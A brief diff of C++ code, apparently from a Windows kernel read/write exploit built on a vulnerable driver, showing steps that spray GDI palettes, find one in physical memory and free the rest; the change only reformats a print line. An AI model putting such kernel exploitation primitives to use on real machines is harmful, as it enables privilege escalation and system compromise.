@@ -88,7 +88,8 @@ KernelReadWrite::KernelReadWrite(const std::string& DriverPath) : driver(DriverP
 	std::cout << "Sprayed palettes\n";
 	// step 2: find palette in physical memory and save mapped page
 	this->FindMappedPalette(palettes);
-	std::cout << "Found mapped palette, handle " << std::hex << this->foundPaletteHandle << " Mapped address " << this->foundPaletteAddress << std::endl;
+	std::cout << "Found mapped palette, handle " << std::hex << \
+		this->foundPaletteHandle << " Mapped address " << this->foundPaletteAddress << std::endl;
 	// step 3: cleanup the rest
 	this->FreeOtherPalettes(std::move(palettes));
 	std::cout << "Freed other palettes\n";
